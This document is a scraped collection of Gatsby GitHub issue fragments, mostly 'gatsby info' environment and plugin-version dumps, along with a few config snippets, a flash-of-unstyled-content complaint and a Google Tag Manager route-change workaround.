``` system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-4790 cpu @ 3.60ghz binaries: yarn: 1.7.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.5.0 - c:\\program files\ odejs\ pm.cmd languages: python: 3.6.2 - c:\\users\\pitkes22\\appdata\\local\\programs\\python\\python36-32\\python.exe browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.0.29 => 2.2.8 gatsby-image: ^2.1.2 => 2.1.2 gatsby-plugin-i18n: ^1.0.1 => 1.0.1 gatsby-plugin-layout: ^1.0.15 => 1.0.15 gatsby-plugin-manifest: ^2.0.2 => 2.0.24 gatsby-plugin-netlify-cms: ^3.0.4 => 3.0.16 gatsby-plugin-offline: ^2.0.5 => 2.0.25 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.10 gatsby-plugin-sass: ^2.0.1 => 2.0.11 gatsby-plugin-sharp: ^2.1.3 => 2.1.3 gatsby-remark-images: ^3.0.14 => 3.0.14 gatsby-remark-relative-images: ^0.2.2 => 0.2.2 gatsby-source-filesystem: ^2.0.5 => 2.0.28 gatsby-transformer-remark: ^2.1.9 => 2.3.8 gatsby-transformer-sharp: ^2.1.21 => 2.1.21
system: os: macos 10.14.4 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 5.3 - /bin/zsh binaries: node: 12.1.0 -
/var/folders/nj/rypkd2js2sbb2y8dl1l8vxqc0000gn/t/fnm-shell-3450044/bin/node npm: 6.9.0 -
/var/folders/nj/rypkd2js2sbb2y8dl1l8vxqc0000gn/t/fnm-shell-3450044/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 74.0.3729.169 firefox: 67.0 safari: 12.1 npmpackages: gatsby: ^2.8.3 => 2.8.3 gatsby-image: ^2.1.2 => 2.1.2 gatsby-plugin-feed: ^2.2.2 => 2.2.2 gatsby-plugin-google-analytics: ^2.0.20 => 2.0.20 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-offline: ^2.1.1 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.1.3 => 2.1.3 gatsby-plugin-typography: ^2.2.13 => 2.2.13 gatsby-remark-copy-linked-files: ^2.0.13 => 2.0.13 gatsby-remark-images: ^3.0.14 => 3.0.14 gatsby-remark-prismjs: ^3.2.9 => 3.2.9 gatsby-remark-responsive-iframe: ^2.1.1 => 2.1.1 gatsby-remark-smartypants: ^2.0.9 => 2.0.9 gatsby-source-filesystem: ^2.0.38 => 2.0.38 gatsby-transformer-remark: ^2.3.12 => 2.3.12 gatsby-transformer-sharp: ^2.1.21 => 2.1.21 npmglobalpackages:
system: os: macos 10.14.3 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.3 - /bin/zsh binaries: node: 10.10.0 - /usr/local/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 74.0.3729.169 firefox: 66.0.3 safari: 12.0.3 npmpackages: gatsby: ^2.8.3 => 2.8.3 gatsby-image: ^2.1.2 => 2.1.2 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-offline: ^2.1.1 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.1.3 => 2.1.3 gatsby-plugin-styled-components: ^3.0.7 => 3.0.7 gatsby-source-filesystem: ^2.0.38 => 2.0.38 gatsby-transformer-sharp: ^2.1.21 => 2.1.21 npmglobalpackages: gatsby-cli: 2.5.12
system: os: macos 10.14.5 cpu: (4) x64 intel(r) core(tm) i5-6360u cpu @ 2.00ghz shell: 5.3 - /bin/zsh binaries: node: 11.9.0 - /usr/local/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.5.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 74.0.3729.169 firefox: 67.0 safari: 12.1.1 npmpackages: gatsby: ^2.2.1 => 2.8.2 gatsby-image: ^2.0.34 => 2.1.2 gatsby-plugin-feed: ^2.0.15 => 2.2.2 gatsby-plugin-google-analytics: ^2.0.17 => 2.0.20 gatsby-plugin-google-tagmanager: ^2.0.13 => 2.0.15 gatsby-plugin-manifest: ^2.0.24 => 2.1.1 gatsby-plugin-offline: ^2.0.25 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.10 => 3.0.12 gatsby-plugin-sass: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: ^2.0.29 => 2.1.3 gatsby-plugin-sitemap: ^2.1.0 => 2.1.0 gatsby-remark-copy-linked-files: ^2.0.11 => 2.0.13 gatsby-remark-images: ^3.0.10 => 3.0.14 gatsby-remark-prismjs: ^3.2.6 => 3.2.9 gatsby-remark-responsive-iframe: ^2.1.1 => 2.1.1 gatsby-remark-smartypants: ^2.0.9 => 2.0.9 gatsby-source-contentful: ^2.0.47 => 2.0.67 gatsby-source-filesystem: ^2.0.27 => 2.0.38 gatsby-transformer-remark: ^2.3.7 => 2.3.12 gatsby-transformer-sharp: ^2.1.17 => 2.1.21 npmglobalpackages: gatsby-cli: 2.6.3 gatsby: 2.7.5
output of `gatsby info --clipboard`: ``` system: os: macos high sierra 10.13.6 cpu: (8) x64 intel(r) core(tm) i7-4980hq cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.3 - ~/.nvm/versions/node/v10.15.3/bin/node npm: 6.4.1 - ~/.nvm/versions/node/v10.15.3/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 74.0.3729.169 firefox: 67.0 safari: 12.1.1 npmpackages: gatsby: ^2.8.2 => 2.8.2 gatsby-plugin-emotion: ^4.0.7 => 4.0.7 gatsby-plugin-typography: ^2.2.13 => 2.2.13 gatsby-source-filesystem: ^2.0.38 => 2.0.38 gatsby-transformer-remark: ^2.3.12 => 2.3.12 npmglobalpackages: gatsby-cli: 2.6.4
system: os: linux 4.15 linux mint 19 (tara) cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 5.4.2 - /usr/bin/zsh binaries: node: 10.15.3 - ~/.nvm/versions/node/v10.15.3/bin/node yarn: 1.16.0 - ~/.nvm/versions/node/v10.15.3/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.15.3/bin/npm languages: python: 2.7.15 - /usr/bin/python browsers: chrome: 72.0.3626.119 firefox: 65.0.1 npmpackages: gatsby: ^2.8.2 => 2.8.2 gatsby-image: ^2.1.2 => 2.1.2 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-offline: ^2.1.1 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.1.3 => 2.1.3 gatsby-source-filesystem: ^2.0.38 => 2.0.38 gatsby-transformer-sharp: ^2.1.21 => 2.1.21 npmglobalpackages: gatsby-cli: 2.6.4
``` system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-4790k cpu @ 4.00ghz binaries: npm: 6.9.0 languages: python: 3.7.0 browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.7.5 => 2.7.5 gatsby-image: ^2.1.2 => 2.1.2 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-offline: ^2.1.1 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sass: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: ^2.1.2 => 2.1.2 gatsby-plugin-typescript: ^2.0.15 => 2.0.15 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-images: ^3.0.14 => 3.0.14 gatsby-remark-prismjs: ^3.2.9 => 3.2.9 gatsby-source-filesystem: ^2.0.37 => 2.0.37 gatsby-transformer-remark: ^2.3.12 => 2.3.12 gatsby-transformer-sharp: ^2.1.20 => 2.1.20
``` system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-4790k cpu @ 4.00ghz binaries: npm: 6.9.0 languages: python: 3.7.0 browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.7.5 => 2.7.5 gatsby-image: ^2.1.2 => 2.1.2 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-offline: ^2.1.1 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sass: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: ^2.1.2 => 2.1.2 gatsby-plugin-typescript: ^2.0.15 => 2.0.15 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-images: ^3.0.14 => 3.0.14 gatsby-remark-prismjs: ^3.2.9 => 3.2.9 gatsby-source-filesystem: ^2.0.37 => 2.0.37 gatsby-transformer-remark: ^2.3.12 => 2.3.12 gatsby-transformer-sharp: ^2.1.20 => 2.1.20
system: os: macos high sierra 10.13.6 cpu: (4) x64 intel(r) core(tm) i5-2400s cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 12.3.1 - /usr/local/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 74.0.3729.169 firefox: 60.0.2 safari: 12.1.1 npmpackages: gatsby: ^2.7.1 => 2.7.1 gatsby-plugin-typescript: ^2.0.15 => 2.0.15
``` system: os: windows 10 cpu: (16) x64 amd ryzen 7 1800x eight-core processor binaries: yarn: 1.13.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.5.0-next.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 browsers: edge: 44.17763.1.0 npmpackages: gatsby: ^2.2.6 => 2.2.6 gatsby-image: ^2.0.22 => 2.0.25 gatsby-plugin-canonical-urls: ^2.0.8 => 2.0.8 gatsby-plugin-catch-links: ^2.0.9 => 2.0.9 gatsby-plugin-excerpts: ^1.0.2 => 1.0.2 gatsby-plugin-favicon: ^3.1.5 => 3.1.5 gatsby-plugin-feed: ^2.0.8 => 2.0.11 gatsby-plugin-google-analytics: ^2.0.5 => 2.0.8 gatsby-plugin-manifest: ^2.0.5 => 2.0.12 gatsby-plugin-meta-redirect: ^1.1.1 => 1.1.1 gatsby-plugin-offline: ^2.0.5 => 2.0.20 gatsby-plugin-prefetch-google-fonts: ^1.1.1 => 1.1.1 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.5 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-root-import: ^2.0.4 => 2.0.4 gatsby-plugin-s3: ^0.2.5 => 0.2.5 gatsby-plugin-sass: ^2.0.7 => 2.0.7 gatsby-plugin-sharp: ^2.0.30 => 2.0.30 gatsby-plugin-sitemap: ^2.0.4 => 2.0.4 gatsby-plugin-typography: ^2.2.0 => 2.2.3 gatsby-redirect-from: ^0.1.1 => 0.1.1 gatsby-remark-autolink-headers: ^2.0.12 => 2.0.12 gatsby-remark-behead: 0.0.3 => 0.0.3 gatsby-remark-copy-linked-files: ^2.0.5 => 2.0.8 gatsby-remark-custom-blocks: ^2.0.3 => 2.0.3 gatsby-remark-embed-youtube: 0.0.7 => 0.0.7 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-images: ^3.0.0 => 3.0.12 gatsby-remark-katex: ^3.0.1 => 3.0.1 gatsby-remark-prismjs: ^3.0.0 => 3.1.4 gatsby-remark-responsive-iframe: ^2.0.5 => 2.0.8 gatsby-remark-smartypants: ^2.0.5 => 2.0.7 gatsby-source-filesystem: ^2.0.27 => 2.0.27 gatsby-transformer-remark: ^2.1.6 => 2.1.17 gatsby-transformer-sharp: ^2.1.3 => 2.1.9 ```
npmpackages: gatsby: ^2.3.25 => 2.7.1 gatsby-image: ^2.0.39 => 2.1.0 gatsby-plugin-emotion: ^4.0.6 => 4.0.6 gatsby-plugin-manifest: ^2.0.29 => 2.1.1 gatsby-plugin-offline: ^2.0.25 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.0.35 => 2.1.0 gatsby-plugin-sitemap: ^2.0.12 => 2.1.0 gatsby-source-filesystem: ^2.0.29 => 2.0.37 gatsby-transformer-remark: ^2.3.10 => 2.3.12 gatsby-transformer-sharp: ^2.1.18 => 2.1.19
system: os: windows 10 cpu: (4) x64 intel(r) core(tm) i5-3550 cpu @ 3.30ghz binaries: npm: 6.4.1 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.4.2 => 2.4.2 gatsby-image: ^2.0.41 => 2.0.41 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-offline: ^2.1.0 => 2.1.0 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sass: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: ^2.0.36 => 2.0.36 gatsby-source-filesystem: ^2.0.33 => 2.0.33 gatsby-transformer-sharp: ^2.1.19 => 2.1.19 ![20190525_110723]( this is what the page looks like on inital load
this stays for a fraction of a second then the site renders fine.
i've made two sites with gatsby recently and both have this issue
one used react-strap and one used material-ui
both had this problem
i've googled it and came up with nothing
i can't possibly be the only one can i?
system: os: macos 10.14.4 cpu: x64 intel(r) core(tm) i5-3210m cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 12.3.1 - ~/.nvm/versions/node/v12.3.1/bin/node yarn: 1.16.0 - ~/.nvm/versions/node/v12.3.1/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v12.3.1/bin/npm browsers: chrome: 74.0.3729.169 firefox: 64.0.2 safari: 12.1 npmpackages: gatsby: ^2.5.7 => 2.5.7 gatsby-image: ^2.1.0 => 2.1.0 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-offline: ^2.1.1 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.0.37 => 2.0.37 gatsby-source-filesystem: ^2.0.37 => 2.0.37 gatsby-source-shopify: latest => 2.0.32 gatsby-transformer-sharp: ^2.1.19 => 2.1.19
``` system: os: macos 10.14.4 cpu: (8) x64 intel(r) core(tm) i7-4750hq cpu @ 2.00ghz shell: 3.2.57 - /bin/bash binaries: node: 8.15.1 - ~/n/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.4.1 - ~/n/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 74.0.3729.157 firefox: 66.0.5 safari: 12.1 npmpackages: gatsby: 2.5.x => 2.5.6 gatsby-image: ^2.1.0 => 2.1.0 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sass: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: ^2.0.37 => 2.0.37 gatsby-remark-copy-linked-files: ^2.0.12 => 2.0.12 gatsby-remark-images: 3.x => 3.0.11 gatsby-remark-prismjs: ^3.2.9 => 3.2.9 gatsby-remark-responsive-iframe: ^2.1.1 => 2.1.1 gatsby-remark-smartypants: ^2.0.9 => 2.0.9 gatsby-source-filesystem: ^2.0.36 => 2.0.36 gatsby-transformer-remark: ^2.3.12 => 2.3.12 gatsby-transformer-sharp: ^2.1.19 => 2.1.19 npmglobalpackages: gatsby-cli: 2.5.15
``` system: os: macos 10.14.4 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 11.14.0 - /usr/local/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 74.0.3729.157 firefox: 66.0.3 safari: 12.1 npmpackages: gatsby: ^2.5.5 => 2.5.5 gatsby-image: ^2.1.0 => 2.1.0 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-offline: ^2.1.1 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.0.37 => 2.0.37 gatsby-source-filesystem: ^2.0.36 => 2.0.36 gatsby-transformer-sharp: ^2.1.19 => 2.1.19 npmglobalpackages: gatsby-cli: 2.5.9
``` ### related #issuecomment-493219565
system: os: macos 10.14.3 cpu: (8) x64 intel(r) core(tm) i7-8559u cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 11.10.0 - ~/.nvm/versions/node/v11.10.0/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.7.0 - ~/.nvm/versions/node/v11.10.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 74.0.3729.157 safari: 12.0.3 npmpackages: gatsby: ^2.5.5 => 2.5.5 gatsby-image: ^2.1.0 => 2.1.0 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-offline: ^2.1.1 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.0.37 => 2.0.37 gatsby-source-filesystem: ^2.0.36 => 2.0.36 gatsby-transformer-sharp: ^2.1.19 => 2.1.19 npmglobalpackages: gatsby-cli: 2.5.15
``` binaries: node: 12.1.0 - /usr/local/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm npmpackages: gatsby: ^2.4.3 => 2.5.5 gatsby-image: ^2.1.0 => 2.1.0 gatsby-plugin-cookiehub: ^1.0.0 => 1.0.0 gatsby-plugin-google-analytics: ^2.0.20 => 2.0.20 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sass: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: ^2.0.37 => 2.0.37 gatsby-plugin-typography: ^2.2.13 => 2.2.13 gatsby-source-contentful: ^2.0.58 => 2.0.60 gatsby-transformer-remark: ^2.3.12 => 2.3.12 gatsby-transformer-sharp: ^2.1.19 => 2.1.19 npmglobalpackages: gatsby-cli: 2.5.14
``` ### file contents #### `gatsby-config.js` (only plugins):
plugins: [ `gatsby-transformer-remark`, `gatsby-plugin-react-helmet`, `gatsby-plugin-sharp`, `gatsby-transformer-sharp`, { resolve: `gatsby-plugin-sass`, options: { data: `@import 'src/styles/variables';`, includepaths: [] } }, { resolve: `gatsby-source-contentful`, options: { spaceid: `snbyslhhwz06`, accesstoken: process.env.contentful_access_token, downloadlocal: true }, }, { resolve: `gatsby-plugin-google-analytics`, options: { trackingid: `redacted`, head: true, anonymize: true, respectdnt: true, cookiedomain: `redacted` } }, { resolve: `gatsby-plugin-cookiehub`, options: { cookihubid: `redacted`, trackingid: `redacted`, head: false, anonymize: true }, } ]
``` #### `gatsby-node.js`:
const path = require('path') exports.createpages = ({graphql, actions}) => { const {createpage} = actions return new promise((resolve, reject) => { const projecttemplate = path.resolve('src/templates/project.js') resolve( graphql(` { allcontentfulproject (limit:100) { edges { node { id title } } } } `) .then((result) => { if (result.errors) { reject(result.errors) } result.data.allcontentfulproject.edges.foreach(edge => { const title = edge.node.title, slug = title.normalize('nfd').replace(/[\\u0300-\\u036f]/g, '').replace(/\\w/g, '-').replace(' ', '-').tolowercase() createpage ({ path: slug, component: projecttemplate, context: { slug: slug } }) }); return }) ) })
google chrome - version 74.0.3729.157
``` system: os: macos 10.14 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 5.3 - /bin/zsh binaries: node: 10.9.0 - /usr/local/bin/node yarn: 1.10.1 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: firefox: 66.0.4 safari: 12.0 npmpackages: gatsby: ^2.5.0 => 2.5.0 npmglobalpackages: gatsby-cli: 2.5.3 gatsby-dev-cli: 2.4.14
``` notes: - if this will be addressed - revert /cc @freiksenet
system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 4.4.23 - /usr/local/bin/bash binaries: node: 8.11.1 - /usr/local/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.5.0 - /usr/local/bin/npm browsers: chrome: 75.0.3770.27 firefox: 66.0.5 safari: 12.1.1
(if relevant) ```console system: os: macos 10.14.4 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.1 - ~/n/bin/node yarn: 1.9.4 - ~/.yarn/bin/yarn npm: 6.4.1 - ~/n/bin/npm languages: python: 2.7.9 - /users/dustin/.pyenv/shims/python browsers: chrome: 74.0.3729.131 firefox: 66.0.2 safari: 12.1 npmpackages: gatsby: ^2.4.5 => 2.4.5 gatsby-image: ^2.0.41 => 2.0.41 gatsby-link: ^2.1.1 => 2.1.1 gatsby-plugin-catch-links: ^2.0.14 => 2.0.14 gatsby-plugin-flow: 1.0.5 => 1.0.5 gatsby-plugin-google-analytics: ^2.0.20 => 2.0.20 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-root-import: 2.0.5 => 2.0.5 gatsby-plugin-sass: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: 2.0.37 => 2.0.37 gatsby-plugin-sitemap: ^2.1.0 => 2.1.0 gatsby-plugin-svgr: 2.0.2 => 2.0.2 gatsby-remark-copy-linked-files: 2.0.12 => 2.0.12 gatsby-remark-images: 3.0.11 => 3.0.11 gatsby-remark-responsive-iframe: ^2.1.1 => 2.1.1 gatsby-remark-smartypants: 2.0.9 => 2.0.9 gatsby-source-filesystem: 2.0.34 => 2.0.34 gatsby-source-wordpress: 3.0.59 => 3.0.59 gatsby-transformer-remark: 2.3.12 => 2.3.12 gatsby-transformer-sharp: ^2.1.19 => 2.1.19 npmglobalpackages: gatsby-cli: 2.4.9 gatsby: 2.0.118
``` ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a `gatsby-node.js`: ```js exports.oncreatepage = async ({ actions, page }) => { const { createpage } = actions return new promise((resolve) => { if (/home/.test(page.path)) page.path = '/' createpage(page); resolve() })
``` `gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: macos 10.14.4 cpu: (8) x64 intel(r) core(tm) i7-8559u cpu @ 2.70ghz shell: 5.3 - /bin/zsh binaries: node: 11.12.0 - /usr/local/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 74.0.3729.131 safari: 12.1 npmpackages: gatsby: 2.4.3 => 2.4.3 gatsby-image: 2.0.41 => 2.0.41 gatsby-plugin-google-analytics: 2.0.19 => 2.0.19 gatsby-plugin-manifest: 2.1.1 => 2.1.1 gatsby-plugin-netlify-cms: 4.0.1 => 4.0.1 gatsby-plugin-offline: 2.1.0 => 2.1.0 gatsby-plugin-react-helmet: 3.0.12 => 3.0.12 gatsby-plugin-sharp: 2.0.37 => 2.0.37 gatsby-plugin-sitemap: 2.1.0 => 2.1.0 gatsby-plugin-styled-components: ^3.0.7 => 3.0.7 gatsby-plugin-typescript: 2.0.13 => 2.0.13 gatsby-remark-autolink-headers: 2.0.16 => 2.0.16 gatsby-remark-copy-linked-files: 2.0.12 => 2.0.12 gatsby-remark-images: 3.0.11 => 3.0.11 gatsby-remark-prismjs: 3.2.9 => 3.2.9 gatsby-remark-relative-images: 0.2.2 => 0.2.2 gatsby-remark-responsive-iframe: 2.1.1 => 2.1.1 gatsby-source-filesystem: 2.0.33 => 2.0.33 gatsby-transformer-remark: 2.3.12 => 2.3.12 gatsby-transformer-sharp: 2.1.19 => 2.1.19 npmglobalpackages: gatsby-cli: 2.4.8
system: os: linux 4.15 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (36) x64 intel(r) xeon(r) platinum 8124m cpu @ 3.00ghz shell: 4.4.12 - /bin/bash binaries: node: 11.5.0 - /usr/local/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/bin/python npmpackages: gatsby: ^2.3.31 => 2.3.31 gatsby-image: ^2.0.37 => 2.0.37 gatsby-paginate: ^1.0.17 => 1.0.17 gatsby-plugin-catch-links: ^2.0.13 => 2.0.13 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-google-tagmanager: ^2.0.12 => 2.0.12 gatsby-plugin-manifest: ^2.0.26 => 2.0.26 gatsby-plugin-netlify: ^2.0.16 => 2.0.16 gatsby-plugin-offline: ^2.1.0 => 2.1.0 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sentry: ^1.0.1 => 1.0.1 gatsby-plugin-sharp: ^2.0.32 => 2.0.32 gatsby-plugin-sitemap: ^2.0.11 => 2.0.11 gatsby-plugin-typography: ^2.2.10 => 2.2.10 gatsby-remark-images: ^3.0.10 => 3.0.10 gatsby-remark-prismjs: ^3.2.7 => 3.2.7 gatsby-source-filesystem: ^2.0.28 => 2.0.28 gatsby-transformer-json: ^2.1.11 => 2.1.11 gatsby-transformer-remark: ^2.3.8 => 2.3.8 gatsby-transformer-sharp: ^2.1.17 => 2.1.17
``` system: os: macos high sierra 10.13.6 cpu: (4) x64 intel(r) core(tm) i7-4558u cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 11.10.0 - /usr/local/bin/node npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 74.0.3729.131 firefox: 52.0.2 safari: 12.1 npmpackages: gatsby: ^2.4.3 => 2.4.3 gatsby-image: ^2.0.41 => 2.0.41 gatsby-plugin-emotion: ^4.0.6 => 4.0.6 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-robots-txt: ^1.4.0 => 1.4.0 gatsby-plugin-sharp: ^2.0.37 => 2.0.37 gatsby-plugin-sitemap: ^2.1.0 => 2.1.0 gatsby-source-filesystem: ^2.0.33 => 2.0.33 gatsby-transformer-sharp: ^2.1.19 => 2.1.19 npmglobalpackages: gatsby-cli: 2.5.13
not relevant to the issue but for completeness ``` system: os: macos 10.14.4 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 11.12.0 - /usr/local/bin/node npm: 6.9.0 - /usr/local/bin/npm languages: python: 3.7.2 - /usr/local/opt/python/libexec/bin/python browsers: chrome: 74.0.3729.131 safari: 12.1 npmpackages: gatsby: ^2.3.16 => 2.3.16 gatsby-cli: ^2.5.12 => 2.5.12 gatsby-image: ^2.0.37 => 2.0.37 gatsby-plugin-google-tagmanager: ^2.0.13 => 2.0.13 gatsby-plugin-manifest: ^2.0.29 => 2.0.29 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-robots-txt: ^1.4.0 => 1.4.0 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sass: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: ^2.0.32 => 2.0.32 gatsby-plugin-sitemap: ^2.0.12 => 2.0.12 gatsby-source-filesystem: ^2.0.29 => 2.0.29 gatsby-transformer-sharp: ^2.1.17 => 2.1.17 npmglobalpackages: gatsby-cli: 2.5.9
``` ### solution in gatsby-browser.js fire a custom gtm event in onrouteupdate - `window.datalayer.push({'event': 'page-change'})`
note the "page-change" is arbitrary
in gtm create a trigger for that custom event and wire ga (and other relevant plug-ins) to it
don't wire those plug-ins to the built in page view event nor a custom history change event
my gatsby-browser.js code is based on the [recent pr]( to the gtag plug-in
### suggested changes at a minimum the readme should be updated
it may also make sense to fire the custom event from the plug-in and tell people to wire it in the gtm ui.
``` system: os: macos 10.14.2 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 2.5.0 - /usr/local/bin/fish binaries: node: 10.15.3 - /usr/local/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/local/bin/python browsers: chrome: 74.0.3729.131 firefox: 66.0.3 safari: 12.0.2 npmpackages: gatsby: ^2.4.2 => 2.4.2 gatsby-image: ^2.0.41 => 2.0.41 gatsby-mdx: ^0.6.3 => 0.6.3 gatsby-plugin-typography: ^2.2.13 => 2.2.13 gatsby-remark-copy-linked-files: ^2.0.12 => 2.0.12 gatsby-remark-prismjs: ^3.2.9 => 3.2.9 gatsby-remark-responsive-iframe: ^2.1.1 => 2.1.1 gatsby-remark-smartypants: ^2.0.9 => 2.0.9 gatsby-source-contentful: ^2.0.55 => 2.0.55 gatsby-source-filesystem: ^2.0.33 => 2.0.33 gatsby-transformer-remark: ^2.3.12 => 2.3.12 npmglobalpackages: gatsby-cli: 2.5.12
``` system: os: macos 10.14.4 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.1 - ~/.nvm/versions/node/v10.15.1/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.15.1/bin/npm languages: python: 3.5.3 - /users/mike/.pyenv/shims/python browsers: chrome: 73.0.3683.103 firefox: 66.0.3 safari: 12.1 npmpackages: gatsby: 2.3.36 => 2.3.36 npmglobalpackages: gatsby-cli: 2.5.12
